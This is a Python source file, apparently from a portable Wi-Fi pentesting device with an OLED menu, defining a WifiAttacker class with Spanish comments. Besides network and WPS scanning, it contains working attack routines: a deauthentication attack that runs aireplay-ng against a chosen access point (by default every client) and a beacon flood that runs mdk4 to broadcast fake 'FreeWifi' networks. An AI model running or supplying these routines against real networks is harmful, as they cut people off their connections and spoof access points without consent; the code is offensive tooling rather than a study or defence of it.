from core.event_bus import bus
from core.logger import get_logger

import subprocess
import threading
import time
import os
import signal

log = get_logger("wifi.attacker")


class WifiAttacker:

    CHANNELS_24 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
    CHANNELS_5  = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104,
                   108, 112, 116, 132, 136, 140, 149, 153, 157, 161, 165]

    def __init__(self, interface="wlan1"):
        self.interface    = interface
        self._hop_thread  = None
        self._hopping     = False

    # ─────────────────────────────────────────
    # HELPERS
    # ─────────────────────────────────────────

    def _is_monitor(self) -> bool:
        try:
            r = subprocess.run(
                ["iwconfig", self.interface],
                capture_output=True, text=True
            )
            return "Mode:Monitor" in r.stdout
        except Exception:
            return False

    def _set_mode(self, mode: str):
        subprocess.run(["sudo", "ip",      "link", "set",  self.interface, "down"], capture_output=True)
        subprocess.run(["sudo", "iwconfig",         self.interface, "mode", mode],  capture_output=True)
        subprocess.run(["sudo", "ip",      "link", "set",  self.interface, "up"],   capture_output=True)
        time.sleep(0.8)

    def _set_channel(self, channel: int):
        subprocess.run(
            ["sudo", "iwconfig", self.interface, "channel", str(channel)],
            capture_output=True
        )

    def _ensure_monitor(self):
        """Garantiza que la interfaz está en modo monitor antes de atacar."""
        if not self._is_monitor():
            log.warning(f"{self.interface} no está en monitor — cambiando...")
            self._set_mode("monitor")
            if not self._is_monitor():
                log.error(f"No se pudo poner {self.interface} en monitor")
                return False
        return True

    # ─────────────────────────────────────────
    # CHANNEL HOPPING
    # ─────────────────────────────────────────

    def _channel_hopper(self, channels: list, interval: float):
        while self._hopping:
            for ch in channels:
                if not self._hopping:
                    return
                self._set_channel(ch)
                time.sleep(interval)

    def start_channel_hopping(self, channels: list = None, interval: float = 0.3):
        if self._hopping:
            return
        channels = channels or self.CHANNELS_24
        self._hopping = True
        self._hop_thread = threading.Thread(
            target=self._channel_hopper,
            args=(channels, interval),
            daemon=True
        )
        self._hop_thread.start()
        log.info(f"Channel hopping iniciado: {channels}")

    def stop_channel_hopping(self):
        self._hopping = False
        if self._hop_thread:
            self._hop_thread.join(timeout=2)
        self._hop_thread = None
        log.info("Channel hopping detenido")

    # ─────────────────────────────────────────
    # SCAN REDES
    # ─────────────────────────────────────────

    def scan_networks(self, include_5ghz: bool = False) -> list:
        log.info(f"Escaneando redes en {self.interface}")
        bus.publish_sync("oled:wifi_status", {"msg": "Escaneando..."})

        was_monitor = self._is_monitor()
        if was_monitor:
            log.info(f"{self.interface} monitor → managed para scan")
            self._set_mode("managed")

        channels = self.CHANNELS_24[:]
        if include_5ghz:
            channels += self.CHANNELS_5

        redes: dict = {}

        try:
            for ch in channels:
                self._set_channel(ch)
                time.sleep(0.25)

                try:
                    result = subprocess.run(
                        ["sudo", "iwlist", self.interface, "scan"],
                        capture_output=True, text=True, timeout=6,
                    )
                except subprocess.TimeoutExpired:
                    log.warning(f"Timeout en canal {ch}, continuando")
                    continue

                current: dict = {}
                for line in result.stdout.splitlines():
                    line = line.strip()

                    if line.startswith("Cell "):
                        if current.get("bssid"):
                            redes.setdefault(current["bssid"], current)
                        bssid = line.split("Address: ")[-1].strip() if "Address:" in line else "??"
                        current = {"bssid": bssid, "ssid": "??", "channel": ch, "rssi": -99}

                    elif "ESSID:" in line:
                        current["ssid"] = line.split('"')[1] if '"' in line else "??"

                    elif "Channel:" in line:
                        try:
                            current["channel"] = int(line.split("Channel:")[-1].strip())
                        except ValueError:
                            pass

                    elif "Signal level=" in line:
                        try:
                            part = line.split("Signal level=")[-1].split(" ")[0]
                            current["rssi"] = int(part)
                        except ValueError:
                            pass

                if current.get("bssid"):
                    redes.setdefault(current["bssid"], current)

                log.debug(f"Canal {ch}: {len(redes)} redes acumuladas")

        except Exception as e:
            log.error(f"Scan error: {e}")
            bus.publish_sync("oled:wifi_status", {"msg": "Error scan"})

        finally:
            if was_monitor:
                log.info(f"Restaurando {self.interface} a monitor")
                self._set_mode("monitor")

        lista = list(redes.values())
        log.info(f"Scan completo: {len(lista)} redes únicas")
        bus.publish_sync("oled:wifi_status", {"msg": f"{len(lista)} redes"})
        return lista

    # ─────────────────────────────────────────
    # WPS SCAN
    # ─────────────────────────────────────────

    def wps_scan(self) -> list:
        log.info(f"Iniciando WPS scan en {self.interface}")
        bus.publish_sync("oled:wifi_status", {"msg": "Escaneando WPS..."})

        redes: dict = {}

        try:
            proc = subprocess.Popen(
                ["sudo", "wash", "-i", self.interface, "--scan", "-s"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid,
            )

            start_time = time.time()
            timeout    = 45

            while time.time() - start_time < timeout:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break

                parts = line.strip().split()
                if len(parts) >= 6 and ":" in parts[0] and parts[0] != "BSSID":
                    bssid = parts[0]
                    redes[bssid] = {
                        "bssid":   bssid,
                        "channel": parts[1],
                        "rssi":    parts[2],
                        "wps_ver": parts[3],
                        "locked":  "Yes" in parts[4],
                        "ssid":    " ".join(parts[5:]) if len(parts) > 5 else "Unknown",
                    }

            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except ProcessLookupError:
                pass

            lista = list(redes.values())
            log.info(f"WPS scan completo: {len(lista)} redes")
            bus.publish_sync("oled:wifi_status",   {"msg": f"WPS: {len(lista)} redes"})
            bus.publish_sync("wifi.wps_scan_done", {"redes": lista})
            bus.publish_sync("oled:return_menu",   {})
            return lista

        except Exception as e:
            log.error(f"WPS scan error: {e}")
            bus.publish_sync("oled:wifi_status", {"msg": "Error WPS"})
            bus.publish_sync("oled:return_menu",  {})
            return []

    # ─────────────────────────────────────────
    # DEAUTH
    # ─────────────────────────────────────────

    def deauth(
        self,
        bssid:   str,
        client:  str = "FF:FF:FF:FF:FF:FF",
        count:   int = 20,
        channel: int = None,
    ) -> bool:
        log.warning(f"Deauth → AP:{bssid} Cliente:{client} Canal:{channel}")
        bus.publish_sync("oled:wifi_status", {"msg": f"Deauth→{bssid[:11]}"})

        if not self._ensure_monitor():
            bus.publish_sync("oled:wifi_status", {"msg": "Error: no monitor"})
            bus.publish_sync("oled:return_menu",  {})
            return False

        if channel:
            log.info(f"Fijando canal {channel}")
            self._set_channel(channel)
            time.sleep(0.3)

        try:
            result = subprocess.run(
                [
                    "sudo", "aireplay-ng",
                    "--deauth", str(count),
                    "-a", bssid,
                    "-c", client,
                    self.interface,
                ],
                capture_output=True, text=True, timeout=30,
            )

            success = result.returncode == 0
            if not success:
                log.error(f"aireplay-ng stderr: {result.stderr.strip()}")

            bus.publish_sync("wifi.deauth_sent", {
                "bssid": bssid, "client": client, "count": count, "success": success,
            })
            bus.publish_sync("oled:wifi_status", {"msg": "Deauth OK" if success else "Deauth fallo"})
            return success

        except subprocess.TimeoutExpired:
            log.error("Deauth timeout")
            bus.publish_sync("oled:wifi_status", {"msg": "Deauth timeout"})
            return False

        except Exception as e:
            log.error(f"Deauth error: {e}")
            bus.publish_sync("oled:wifi_status", {"msg": "Error Deauth"})
            return False

        finally:
            bus.publish_sync("oled:return_menu", {})

    # ─────────────────────────────────────────
    # BEACON FLOOD
    # ─────────────────────────────────────────

    def beacon_flood(self, ssid: str = "FreeWifi", channel: int = 6, duration: int = 30) -> bool:
        if not channel:
            channel = 6

        log.warning(f"Beacon flood → SSID:{ssid} ch:{channel} dur:{duration}s")
        bus.publish_sync("oled:wifi_status", {"msg": "Beacon Flood..."})

        if not self._ensure_monitor():
            bus.publish_sync("oled:wifi_status", {"msg": "Error: no monitor"})
            bus.publish_sync("oled:return_menu",  {})
            return False

        try:
            with open("/tmp/ssid_list.txt", "w") as f:
                f.write(f"{ssid}\n")

            # mdk4 es proceso continuo — lo lanzamos y lo matamos después de duration
            proc = subprocess.Popen(
                [
                    "sudo", "mdk4",
                    self.interface, "b",
                    "-f", "/tmp/ssid_list.txt",
                    "-c", str(channel),
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid,
            )

            log.info(f"mdk4 PID:{proc.pid} corriendo {duration}s")
            bus.publish_sync("oled:wifi_status", {"msg": f"Beacon {duration}s..."})

            time.sleep(duration)

            # Matar el proceso al terminar
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=3)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                proc.kill()

            log.info("mdk4 detenido")
            bus.publish_sync("wifi.beacon_flood_sent", {"ssid": ssid, "success": True})
            bus.publish_sync("oled:wifi_status", {"msg": "Beacon OK"})
            return True

        except FileNotFoundError:
            log.error("mdk4 no instalado")
            bus.publish_sync("oled:wifi_status", {"msg": "mdk4 missing"})
            return False

        except Exception as e:
            log.error(f"Beacon error: {e}")
            bus.publish_sync("oled:wifi_status", {"msg": "Error Beacon"})
            return False

        finally:
            bus.publish_sync("oled:return_menu", {})